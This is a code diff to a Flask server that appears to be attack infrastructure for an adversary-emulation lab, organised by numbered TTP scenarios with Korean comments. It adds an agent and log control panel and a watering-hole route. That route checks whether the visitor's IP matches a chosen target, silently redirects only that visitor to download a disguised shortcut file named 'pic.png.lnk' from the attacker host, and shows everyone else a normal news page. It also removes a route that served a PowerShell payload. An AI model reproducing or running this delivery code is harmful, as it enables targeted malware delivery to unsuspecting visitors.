@@ -15,7 +15,30 @@ AGENT_DIR = os.path.join(BASE_DIR, "agents")
 LOG_FILE = os.path.join(BASE_DIR, "logs/access.log")
 UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")
 
+# ========================================
+# control panel
+# ========================================
+@app.route("/control")
+def control_panel():
+    return send_file("templates/control.html")
+@app.route("/api/agents")
+def api_agents():
+    try:
+        files = os.listdir(AGENT_DIR)
+        files = [f for f in files if not f.startswith('.')]
+        return jsonify({"agents": sorted(files)})
+    except:
+        return jsonify({"agents": []})
 
+@app.route("/api/logs")
+def api_logs():
+    try:
+        with open(LOG_FILE, "r", encoding="utf-8") as f:
+            logs = f.readlines()
+        logs = [log.strip() for log in logs[-50:]]
+        return jsonify({"logs": logs})
+    except:
+        return jsonify({"logs": ["No logs yet"]})
 
 # ========================================
 # TTPs2 설정
@@ -31,7 +54,42 @@ WATERING_HOLE_TARGET = "192.168.56.145"  # 워터링홀 타겟
 WATERING_HOLE_DIR = os.path.join(BASE_DIR, "watering_hole")
 os.makedirs(WATERING_HOLE_DIR, exist_ok=True)
 
+
+
 # ========================================
+# TTPs10 설정
+# ========================================
+TTPS10_TARGET = "192.168.56.200"
+LNK_FILE = os.path.join(AGENT_DIR, "pic.png.lnk")
+
+# 라우트 추가 (기존 라우트들과 함께)
+@app.route("/news/article/1")
+def news_article():
+    client_ip = get_client_ip()
+    log_event(f"[NEWS_ACCESS] ip={client_ip}")
+    
+    if client_ip == TTPS10_TARGET:
+        log_event(f"[NEWS_TARGET_HIT] ip={client_ip} - Redirect to LNK")
+        return redirect(f"http://{ATTACKER_HOST}:{PORT}/download/malicious.lnk", code=302)
+    else:
+        return send_file(os.path.join(WATERING_HOLE_DIR, "ttps10_normal.html"))
+
+@app.route("/download/malicious.lnk")
+def download_lnk():
+    client_ip = get_client_ip()
+    log_event(f"[LNK_DOWNLOAD] ip={client_ip}")
+    
+    if not os.path.exists(LNK_FILE):
+        return "Not found", 404
+    
+    return send_file(LNK_FILE, 
+                     as_attachment=True,
+                     download_name='pic.png.lnk',
+                     mimetype='application/octet-stream')
+               
+# ========================================
+
+                     
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
 
@@ -190,14 +248,6 @@ def watering_hole():
     else:
         return send_file(os.path.join(WATERING_HOLE_DIR, "index.html"))
 
-
-@app.route("/watering_hole/payload.ps1")
-def watering_hole_payload():
-    client_ip = get_client_ip()
-    log_event(f"[WATERING_HOLE_PAYLOAD] ip={client_ip}")
-    return send_file(os.path.join(WATERING_HOLE_DIR, "payload.ps1"))
-
-
 @app.route("/watering_hole/log")
 def watering_hole_log():
     client_ip = get_client_ip()
@@ -205,5 +255,6 @@ def watering_hole_log():
     log_event(f"[WATERING_HOLE_EVENT] ip={client_ip} event={event}")
     return "", 204
     
+    
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=PORT)
+    app.run(host="192.168.56.1", port=PORT)
